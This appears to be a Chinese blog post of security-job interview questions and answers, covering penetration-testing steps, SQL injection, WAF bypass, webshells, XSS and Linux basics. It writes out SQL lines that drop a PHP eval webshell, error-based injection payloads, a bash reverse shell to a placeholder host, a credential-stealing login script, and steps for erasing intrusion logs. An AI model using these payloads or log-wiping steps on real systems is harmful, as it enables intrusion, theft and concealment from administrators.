<p>所谓 iOS 系统的越狱就是取得系统最高权限的行为，越狱前后 iOS 系统本身并不会发生质的改变，只是越狱后可以对 iOS 系统进行更充分的利用而已。 </p>
<p>越狱的好处： </p>
<ol>
<li>越狱之后操作性更强，取得了手机的最高权限，就可以修改手机内容，包括安装免费的破解软件、自定义功能、美化等等。 </li>
<li>越狱后可以绕过 AppStore 免费下载 APP。</li>
</ol>
<p>越狱的坏处： </p>
<ol>
<li>越狱后失去保修。 </li>
<li>越狱之后，后台程序运行，桌面主题等都会加大耗电。 </li>
<li>越狱就是打破 iOS 系统封闭，所以手机就相对变得不安全了</li>
</ol>
<p>序列化与反序列化的区别 </p>
<p>序列化：把对象转化为可传输的字节序列过程称为序列化。 </p>
<p>反序列化：把字节序列还原为对象的过程称为反序列化。</p>
<h1 id="渗透实操"><a href="#渗透实操" class="headerlink" title="渗透实操"></a>渗透实操</h1><p>拿到一个待检测的站，你觉得应该先做什么？</p>
<p>a、信息收集 </p>
<ol>
<li>获取域名的 whois 信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。 </li>
<li>查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。 </li>
<li>查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞 </li>
<li>查看 IP，进行 IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh 弱口令等。 </li>
<li>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如 php 探针 </li>
<li>google hack 进一步探测网站的信息，后台，敏感文件</li>
</ol>
<p>b、漏洞扫描 </p>
<p>开始检测漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等 </p>
<p>c、漏洞利用 </p>
<p>利用以上的方式拿到 webshell，或者其他权限 </p>
<p>d、权限提升 </p>
<p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，如 iis6,pr, 巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 </p>
<p>e、日志清理 </p>
<p>f、总结报告及修复方案</p>
<p>SQL注入</p>
<p>mysql 注入点，用工具对目标站直接写入一句话，需要哪些条件？</p>
<p>root 权限以及网站的绝对路径。 </p>
<p>如何突破注入时字符被转义？</p>
<p>宽字符注入 </p>
<p>hex 编码绕过 </p>
<p>sql 注入有以下两个测试选项，选一个并且阐述不选另一个的理由： </p>
<p>A. demo.jsp?id&#x3D;2+1 </p>
<p>B. demo.jsp?id&#x3D;2-1 </p>
<p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆 </p>
<p>注入时可以不使用and 或 or 或 xor，直接 order by 开始注入吗？</p>
<p>and&#x2F;or&#x2F;xor，前面的 1&#x3D;1、1&#x3D;2 步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。 </p>
<p>以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？ </p>
<p>demo.do?DATA&#x3D;AjAxNg&#x3D;&#x3D; </p>
<p>DATA 有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试 </p>
<p>sql 注入写文件都有哪些函数？ </p>
<p>select ‘一句话’ into outfile ‘路径’select ‘一句话’ into dumpfile ‘路径’select ‘<?php eval($_POST[1]) ?>‘ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’; </p>
<p>sql 如何写 shell 单引号被过滤怎么办 </p>
<p>写 shell: root 权限，GPC 关闭，知道文件路径 outfile 函数 <code>http://127.0.0.1:81/sqli.php?id=1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&lt;?php phpinfo(); ?&gt;&#39;</code> <code>http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;</code> </p>
<p>报错注入的函数有哪些？10 个 </p>
<ol>
<li>and extractvalue(1, concat(0x7e,(select @@version),0x7e))</li>
<li>通过 floor 报错 向下取整 </li>
<li>+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</li>
<li>geometrycollection()select from test where id&#x3D;1 and geometrycollection((select from(selectfrom(select user())a)b));</li>
<li>multipoint()select from test where id&#x3D;1 and multipoint((select from(select from(select user())a)b));</li>
<li>polygon()select from test where id&#x3D;1 and polygon((select from(select from(select user())a)b));</li>
<li>multipolygon()select from test where id&#x3D;1 and multipolygon((select from(select from(select user())a)b));</li>
<li>linestring()select from test where id&#x3D;1 and linestring((select from(select from(select user())a)b));</li>
<li>multilinestring()select from test where id&#x3D;1 and multilinestring((select from(select from(select user())a)b));</li>
<li>exp()select from test where id&#x3D;1 and exp(~(select * from(select user())a));</li>
</ol>
<p>某个防注入系统，在注入时会提示：</p>
<p>系统检测到你有非法注入的行为。 </p>
<p>已记录您的 ip xx.xx.xx.xx </p>
<p>时间:2016:01-23 </p>
<p>提交页面:test.asp?id&#x3D;15 </p>
<p>提交内容:and 1&#x3D;1 </p>
<p>如何利用这个防注入系统拿shell？</p>
<p>在 URL 里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件直接上菜刀链接。 </p>
<p>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选？ </p>
<p>有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell </p>
<p>如何绕过 waf？ </p>
<p>大小写转换法、干扰字符 、&#x2F;*!*&#x2F; 、编码 base64 、unicode 、hex 、url 、ascll 、复参数 </p>
<p>在某后台新闻编辑界面看到编辑器，应该先做什么？</p>
<p>查看编辑器的名称版本,然后搜索公开的漏洞。 </p>
<p>拿到一个webshell发现网站根目录下有 .htaccess文件，我们能做什么？</p>
<p>能做的事情很多，用隐藏网马来举例子：插入&lt;FilesMatch “xxx.jpg”&gt; SetHandler application&#x2F;x-httpd-php .jpg 文件会被解析成.php 文件。具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。 </p>
<p>access 扫出后缀为 asp 的数据库文件，访问乱码，如何实现到本地利用？</p>
<p>迅雷下载，直接改后缀为.mdb。 </p>
<p>提权时选择可读写目录，为何尽量不用带空格的目录？</p>
<p>因为 exp 执行多半需要空格界定参数</p>
<p>上传大马后访问乱码时，有哪些解决办法？</p>
<p>浏览器中改编码。 </p>
<p>审查上传点的元素有什么意义？</p>
<p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
<p>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</p>
<p>先爆破用户名，再利用被爆破出来的用户名爆破密码。 </p>
<p>其实有些站点，在登陆处也会这样提示 </p>
<p>所有和数据库有交互的地方都有可能有注入。 </p>
<p>目标站发现某 txt 的下载地址为 <a target="_blank" rel="noopener" href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a> </p>
<p>这就是传说中的下载漏洞！在 file&#x3D;后面尝试输入 index.php 下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。 </p>
<p>假如给你一个目标站，并且告诉你根目录下存在 &#x2F;abc&#x2F; 目录，并且此目录下存在编辑器和 admin 目 录。请问你的想法是？</p>
<p>直接在网站二级目录&#x2F;abc&#x2F;下扫描敏感文件及目录。 </p>
<p>在有 shell 的情况下，如何使用 xss 实现对目标站的长久控制？</p>
<p>后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。 </p>
<p>在登录后才可以访问的文件中插入 XSS 脚本。 </p>
<p>后台修改管理员密码处，原密码显示为xxx。你觉得该怎样实现读出这个用户的密码？</p>
<p>审查元素 把密码处的 password 属性改成 text 就明文显示了 </p>
<p>目标站无防护，上传图片可以正常访问，上传脚本格式访问则   403  什么原因？</p>
<p>原因很多，有可能 web 服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过 </p>
<p>审查元素得知网站所使用的防护软件，你觉得怎样做到的？</p>
<p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12 看 HTML 体部 比如护卫神就可以在名称那看到内容。 </p>
<p>在 win2003 服务器中建立一个 .zhongzi 文件夹用意何为？ </p>
<p>隐藏文件夹，为了不让管理员发现你传上去的工具。 </p>
<p>为何一个mysql数据库的站，只有一个80端口开放？</p>
<p>更改了端口，没有扫描出来。 </p>
<p>站库分离。 </p>
<p>3306 端口不对外开放 </p>
<p>如何手工快速判断目标站是 windows 还是 linux 服务器</p>
<p>linux 大小写敏感,windows 大小写不敏感。 </p>
<p>3389无法连接的几种情况</p>
<p>没开放 3389 端口</p>
<p>端口被修改 </p>
<p>防护拦截 </p>
<p>处于内网(需进行端口转发) </p>
<p>给你一个网站你是如何来渗透测试的?在获取书面授权的前提下：sqlmap，怎么对一个注入点注入？ </p>
<ol>
<li>如果是 get 型号，直接，sqlmap -u “诸如点网址”. </li>
<li>如果是 post 型诸如点，可以 sqlmap -u “注入点网址” –data&#x3D;”post 的参数” </li>
<li>如果是 cookie，X-Forwarded-For 等，可以访问的时候，用 burpsuite 抓包，注入处用星号替换，放到文件里，然后 sqlmap -r “文件地址”</li>
</ol>
<p>如何向服务器写入 webshell？ </p>
<p>各种上传漏洞 mysql 具有写入权限,用 sql 语句写入 shellhttp put 方法 </p>
<p>img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？ </p>
<p>src 指定一个远程的脚本文件，获取 referer </p>
<p>img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径。</p>
<p>1）远程服务器修改 apache 配置文件，配置.jpg 文件以 php 方式来解析 AddType application&#x2F;x-httpd-php .jpg <img src=http://xss.tv/1.jpg> 会以 php 方式来解析 </p>
<p>宽字节注入代替空格的方法 </p>
<p>%0a、%0b、%a0 等&#x2F;&#x2F; 等注释符&lt;&gt; </p>
<p>mysql 的网站注入，5.0 以上和 5.0 以下有什么区别？</p>
<p>5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名。 </p>
<p>5.0 以下是多用户单操作，5.0 以上是多用户多操做。 </p>
<p>Jsonp 安全攻防技术，怎么写 Jsonp 的攻击页面？ </p>
<p>JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。攻击页面JSON 劫持，跨域劫持敏感信息，页面类似于 function wooyun(v){alert(v.username);}</script><script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script></p>
<p>Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利用参照知道创宇的 JSONP 安全攻防技术。 </p>
<p>php 中命令执行涉及到的函数 </p>
<ol>
<li>代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function() </li>
<li>文件读取： file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(),fgets(),parse_ini_file(),show_source(),file()等</li>
<li>命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</li>
</ol>
<p>数据库 </p>
<p>各种数据库文件存放的位置：</p>
<ol>
<li>mysql: &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F; </li>
<li>C:\ProgramData\MySQL\MySQL Server 5.6\Data\ </li>
<li>oracle:$ORACLE_BASE&#x2F;oradata&#x2F;$ORACLE_SID&#x2F;</li>
</ol>
<p>目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？ </p>
<p>原因很多，有可能 Web 服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。 </p>
<p>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？ </p>
<p>先爆破用户名，再利用被爆破出来的用户名爆破密码；其实有些站点，在登陆处也会这样提示；所有和数据库有交互的地方都有可能有注入。 </p>
<p>Web 服务器被入侵后，怎样进行排查？ </p>
<p>最简单就是 </p>
<ol>
<li>查看下 web 服务器日志 </li>
<li>看看有没有异常端口开放 </li>
<li>使用安全狗等服务器安全软件清扫</li>
</ol>
<p>wireshark 简单的过滤规则 </p>
<ol>
<li>过滤 ip：过滤源 ip 地址:ip.src&#x3D;&#x3D;1.1.1.1;,目的 ip 地址:ip.dst&#x3D;&#x3D;1.1.1.1; </li>
<li>过滤端口：过滤 80 端口:tcp.port&#x3D;&#x3D;80,源端口:tcp.srcport&#x3D;&#x3D;80,目的端口:tcp.dstport&#x3D;&#x3D;80 </li>
<li>协议过滤：直接输入协议名即可,如 http 协议 http </li>
<li>http 模式过滤：过滤 get&#x2F;post 包 http.request.mothod&#x3D;&#x3D;”GET&#x2F;POST”</li>
</ol>
<p>主机被入侵，你会如何处理这件事自查解决方案：</p>
<ol>
<li><p>病毒木马排查。 </p>
<p>使用 netstat 查看网络连接，分析是否有可疑发送行为，如有则停止。 </p>
<p>使用杀毒软件进行病毒查杀。 </p>
</li>
<li><p>服务器漏洞排查并修复 </p>
<ol>
<li>查看服务器账号是否有异常，如有则停止删除掉。</li>
<li>查看服务器是否有异地登录情况，如有则修改密码为强密码（字每+数字+特殊符号）大小写，10 位及以上。 </li>
<li>查看 Jenkins、Tomcat、PhpMyadmin、WDCP、Weblogic 后台密码，提高密码强度（字每+数字+特殊符号）大小写，10 位及以上。 </li>
<li>查看 WEB 应用是否有漏洞，如 struts, ElasticSearch 等，如有则请升级。 </li>
<li>查看 MySQL、SQLServer、FTP、WEB 管理后台等其它有设置密码的地方，提高密码强度（字每+数字+特殊符号）大小写，10 位及以上。 </li>
<li>查看 Redis 无密码可远程写入文件漏洞，检查&#x2F;root&#x2F;.ssh&#x2F;下黑客创建的 SSH 登录密钥文件，删除掉，修改 Redis 为有密码访问并使用强密码，不需要公网访问最好 bind127.0.0.1 本地访问。 </li>
<li>如果有安装第三方软件，请按官网指引进行修复。</li>
</ol>
</li>
<li><p>开启云盾服务，并开启所有云盾安全防护功能对您的主机进行安全防护，免于再次遭到恶意攻击。实施安全防御方案 请您尽快开启云盾服务，开启步骤详见：<a target="_blank" rel="noopener" href="http://help.aliyun.com/view/11108300_13730770.html">http://help.aliyun.com/view/11108300_13730770.html</a></p>
</li>
<li><p>如果问题仍未解决</p>
</li>
</ol>
<p>经过以上处理还不能解决问题，强烈建议您将系统盘和数据盘的数据完全下载备份到本地保存后，重置全盘（登陆 <a target="_blank" rel="noopener" href="http://www.aliyun.com/">www.aliyun.com</a>, 进入我的阿里云-》管理控制台-》云服务器 ECS 控制台-》点击进行您需要进行初始化的实例，备份完服务器数据后关闭实例，点击“重置磁盘”，按您的实际情况选择系统盘和数据盘重置即可）后，重新部署程序应用并对数据进行杀毒后上传，并重新进行前述的 3步处理。 </p>
<h1 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h1><p>Linux操作系统面试题</p>
<h1 id="命令基础"><a href="#命令基础" class="headerlink" title="命令基础"></a>命令基础</h1><p>对于任何一个命令，怎么查看帮助？<br>man ls</p>
<p>whatis ls </p>
<p>通过文件名查找文件操作</p>
<p>find &#x2F; -name “*.txt”</p>
<p>whereis</p>
<p>locate</p>
<p>创建文件、移动重命名文件、删除文件、复制</p>
<p>touch&#x2F;vi、mv、rm、cp</p>
<p>查看文件内容的命令</p>
<p>vi cat more less tail head</p>
<p>实时查看最新日志文件</p>
<p>tail -f xxx.log</p>
<p>根据文件内容查找文件</p>
<p>grep -i “6226” xxx.log</p>
<p>权限含义、修改权限</p>
<p>777是什么意思？</p>
<p>7&#x3D;4+2+1 read write execute<br>chmod 777 test.a</p>
<p>查看mysql进程是否启动；杀进程</p>
<p>ps -ef|grep mysql</p>
<p>kill -9</p>
<p>查看内存、CPU</p>
<p>top</p>
<p>查看磁盘占用情况</p>
<p>df</p>
<p>解压和打包</p>
<p>tar -zxvf filename.tar.gz</p>
<p>tar -cvf &#x2F;tmp&#x2F;etc.tar &#x2F;etc</p>
<p>查看历史命令</p>
<p>history</p>
<p>查看网络</p>
<p>ifconfig</p>
<p>查看端口是否运行</p>
<p>netstat -an|grep 3306</p>
<p>查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点 ·</p>
<ol>
<li>netstat -antp</li>
<li>ss -l</li>
</ol>
<p>ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，而且比 netstat 更快速更高效。 </p>
<p>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么? </p>
<p>bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;4444 0&gt;&amp;1 </p>
<p>其它</p>
<p>入侵 Linux 服务器后需要清除哪些日志？ </p>
<ol>
<li>web 日志，如 apache 的 access.log,error.log。</li>
<li>直接将日志清除过于明显,一般使用 sed 进行定向清除 e.g. sed -i -e ‘&#x2F;192.169.1.1&#x2F;d’ </li>
<li>history 命令的清除，也是对~&#x2F;.bash_history 进行定向清除 </li>
<li>wtmp 日志的清除，&#x2F;var&#x2F;log&#x2F;wtmp </li>
<li>登录日志清除 &#x2F;var&#x2F;log&#x2F;secure</li>
</ol>
<p>通过 Linux 系统的&#x2F;proc 目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？· </p>
<p>ls &#x2F;proc </p>
<p>系统信息，硬件信息，内核版本，加载的模块，进程 </p>
<p>linux 系统中，检测哪些配置文件的配置项，能够提升 SSH 的安全性。 </p>
<p>&#x2F;etc&#x2F;ssh&#x2F;sshd___configiptables 配置 </p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">董小瑞</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://example.com/2023/03/30/%E9%9D%A2%E8%AF%95%E9%A2%98/">http://example.com/2023/03/30/%E9%9D%A2%E8%AF%95%E9%A2%98/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">董小瑞</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/03/30/%E6%BA%AF%E6%BA%90/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            董小瑞
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/03/30/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            董小瑞
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">董小瑞</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "6";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
